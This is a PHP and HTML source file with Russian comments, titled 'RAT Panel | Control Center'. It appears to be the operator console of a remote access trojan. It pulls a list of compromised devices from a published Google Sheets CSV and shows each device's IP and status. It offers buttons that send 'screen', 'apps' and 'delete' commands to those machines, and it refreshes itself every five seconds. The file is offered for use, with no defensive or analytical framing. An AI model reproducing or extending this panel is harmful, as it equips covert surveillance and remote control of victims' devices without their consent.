<?php
// PHP-логика (парсинг данных)
$csvUrl = "https://docs.google.com/spreadsheets/d/e/2PACX-1vTdx2B6KMZldMKf_mGRigmL0AqP0DtaNmaHeJhJQI31AJgd1hIgRMFk_Mv5DlDKm0AzI_mJF0Lfg7Ev/pub?gid=0&single=true&output=csv";
$data = @file_get_contents($csvUrl);
$rows = $data ? array_map('str_getcsv', explode("\n", $data)) : [];
array_shift($rows); // Убираем заголовок

$devices = [];
foreach ($rows as $row) {
    if (count($row) < 3) continue;
    $ip = trim($row[1]);
    $devices[$ip] = [
        'time' => $row[0],
        'status' => $row[2],
        'name' => $row[3] ?? 'Неизвестен'
    ];
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>RAT Panel | Control Center</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #0f172a; color: #e2e8f0; }
        .card { background: #1e293b; border: 1px solid #334155; }
        .btn-action { font-size: 0.7rem; margin: 2px; }
        .online { color: #34d399; font-weight: bold; }
    </style>
</head>
<body class="p-4">
    <div class="container-fluid">
        <h2 class="mb-4 text-white">Управление устройствами</h2>
        <div id="main-grid" class="row g-3">
            <?php foreach($devices as $ip => $d): ?>
            <div class="col-md-3">
                <div class="card p-3">
                    <h5><?= htmlspecialchars($d['name']) ?></h5>
                    <small class="text-secondary"><?= $ip ?></small>
                    <p class="mt-2">Статус: <span class="online"><?= $d['status'] ?></span></p>
                    <div class="d-flex flex-wrap">
                        <button onclick="sendCommand('<?= $ip ?>', 'screen')" class="btn btn-sm btn-primary btn-action">📸 Screen</button>
                        <button onclick="sendCommand('<?= $ip ?>', 'app')" class="btn btn-sm btn-info btn-action">📋 Apps</button>
                        <button onclick="sendCommand('<?= $ip ?>', 'delete')" class="btn btn-sm btn-danger btn-action">❌ Clear</button>
                    </div>
                </div>
            </div>
            <?php endforeach; ?>
        </div>
    </div>

    <script>
        // Отправка команды на PHP-скрипт (или прямо на Render) без перезагрузки
        function sendCommand(ip, cmd) {
            const formData = new FormData();
            formData.append('pc_id', ip);
            formData.append('send_cmd', '1');
            formData.append('cmd', cmd);

            fetch('', { method: 'POST', body: formData })
                .then(() => alert('Команда ' + cmd + ' отправлена для ' + ip));
        }

        // Автообновление карточек каждые 5 сек
        setInterval(() => {
            fetch(window.location.href)
                .then(res => res.text())
                .then(html => {
                    const newContent = new DOMParser().parseFromString(html, 'text/html').getElementById('main-grid').innerHTML;
                    document.getElementById('main-grid').innerHTML = newContent;
                });
        }, 5000);
    </script>
</body>
</html>
